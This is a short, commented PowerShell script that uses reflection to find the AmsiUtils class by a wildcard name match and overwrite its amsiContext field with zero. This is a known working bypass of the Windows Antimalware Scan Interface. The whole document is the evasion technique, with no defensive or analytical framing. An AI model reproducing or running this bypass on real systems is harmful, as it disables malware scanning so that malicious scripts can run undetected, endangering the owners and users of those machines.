# Get all types from the loaded assembly
$assemblyTypes = [Ref].Assembly.GetTypes()

# Find the type whose name matches *iUtils
foreach ($type in $assemblyTypes) {
    if ($type.Name -like "*iUtils") {
        $iUtilsType = $type
        break
    }
}

# Retrieve the non-public static fields of the found type
$fields = $iUtilsType.GetFields("NonPublic,Static")

# Find the field whose name matches *Context
foreach ($field in $fields) {
    if ($field.Name -like "*Context") {
        $contextField = $field
        break
    }
}

# Get the value of the context field
$contextValue = $contextField.GetValue($null)

# Convert the value to an IntPtr
[IntPtr]$pointer = $contextValue

# Create a buffer with a single integer (0)
[Int32[]]$buffer = @(0)

# Overwrite the memory location pointed to by the pointer
[System.Runtime.InteropServices.Marshal]::Copy($buffer, 0, $pointer, 1)